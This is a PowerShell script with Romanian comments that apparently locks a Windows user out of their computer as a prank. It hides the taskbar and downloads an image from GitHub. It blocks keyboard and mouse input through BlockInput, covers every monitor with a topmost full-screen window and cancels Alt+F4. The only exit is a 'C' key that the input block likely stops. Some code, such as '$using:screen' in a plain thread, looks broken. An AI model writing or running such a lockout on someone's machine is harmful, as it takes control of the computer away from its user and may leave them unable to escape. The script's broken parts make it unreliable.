Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Cod C# pentru blocare input
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@

# Cod C# pentru taskbar
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class TaskbarHider {
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Ascunde taskbar-ul
$taskbar = [TaskbarHider]::FindWindow("Shell_TrayWnd", "")
[TaskbarHider]::ShowWindow($taskbar, 0)

# Descarcă poza
$tempImage = "$env:TEMP\poza_laptop.jpg"
if (-not (Test-Path $tempImage)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $tempImage
}

# Blochează input
[InputBlocker]::BlockInput($true)

# Variabilă globală partajată
$global:forme = @()
$global:inchidereCeruta = $false

# Funcție care afișează fereastra pe un anumit ecran
function Start-DisplayWindow {
    param ($screen)

    $form = New-Object Windows.Forms.Form
    $form.StartPosition = 'Manual'
    $form.Bounds = $screen.Bounds
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.ShowInTaskbar = $false
    $form.BackColor = 'Black'
    $form.KeyPreview = $true
    $form.Cursor = [System.Windows.Forms.Cursors]::None

    $image = [System.Drawing.Image]::FromFile($tempImage)
    $pictureBox = New-Object Windows.Forms.PictureBox
    $pictureBox.Image = $image
    $pictureBox.SizeMode = 'Zoom'
    $pictureBox.Dock = 'Fill'
    $form.Controls.Add($pictureBox)

    # La apăsarea tastei C
    $form.Add_KeyDown({
        if ($_.KeyCode -eq 'C') {
            $global:inchidereCeruta = $true
            foreach ($f in $global:forme) {
                try { $f.Invoke([Action]{ $f.Close() }) } catch {}
            }
        }
    })

    # Previne Alt+F4
    $form.Add_FormClosing({
        if (-not $global:inchidereCeruta) {
            $_.Cancel = $true
        }
    })

    $global:forme += $form

    [System.Windows.Forms.Application]::Run($form)
}

# Creează câte un thread pentru fiecare monitor
$threads = @()
foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $thread = [System.Threading.Thread]::New([Threading.ThreadStart]{
        Start-DisplayWindow -screen $using:screen
    })
    $thread.SetApartmentState("STA")
    $threads += $thread
    $thread.Start()
}

# Așteaptă ca toate ferestrele să se închidă
while (-not $global:inchidereCeruta) {
    Start-Sleep -Milliseconds 200
}

# Când ieșim, deblocăm input și restaurăm taskbar
[InputBlocker]::BlockInput($false)
[TaskbarHider]::ShowWindow($taskbar, 1)
